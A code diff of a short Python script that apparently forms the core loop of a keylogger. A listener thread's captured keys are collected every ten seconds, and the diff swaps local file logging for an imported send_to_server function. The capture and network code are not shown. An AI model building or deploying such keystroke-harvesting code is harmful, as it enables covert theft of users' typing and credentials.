@@ -1,26 +1,17 @@
 import threading
 from time import sleep
-from log_creator import create_log
+from example_tools import send_to_server
 from listener import Listener
 
 class Manager:
     def __init__(self):
         self.listener = Listener()
         self.process = threading.Thread(target=self.listener.run)
-
     def start(self):
         self.process.start()
-
     def stop(self):
         self.listener.stop()
 
-def encryptor(data):
-    return str((data[::-1]))
-
-def send_to_server(data):
-    if data:
-        with open("log.txt", "a", encoding="utf-8") as f:
-            f.write(f'{create_log(data)}\n')
 
 if __name__ == '__main__':
 
@@ -30,5 +21,3 @@ if __name__ == '__main__':
         sleep(10)
         t = p.listener.get_keys()
         send_to_server(t)
-        if t:
-            print(create_log(t))
